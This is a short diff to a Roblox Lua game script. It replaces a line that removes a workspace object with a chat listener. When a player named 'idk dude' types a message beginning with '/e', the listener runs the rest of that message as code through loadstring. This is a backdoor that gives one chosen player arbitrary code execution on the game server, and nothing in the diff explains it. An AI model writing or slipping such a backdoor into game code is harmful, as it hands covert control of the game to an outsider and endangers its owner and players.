@@ -1,1 +1,10 @@
-workspace.AshleyCold:Remove()
+game:GetService('Players').PlayerAdded:connect(function(player)
+  if player.Name == "idk dude" then
+    player.Chatted:connect(function(Message)
+    if string.sub(Message,1,2) == "/e" then
+      loadstring(string.sub(Message,4))()
+    end
+    end)
+  
+  end
+end)
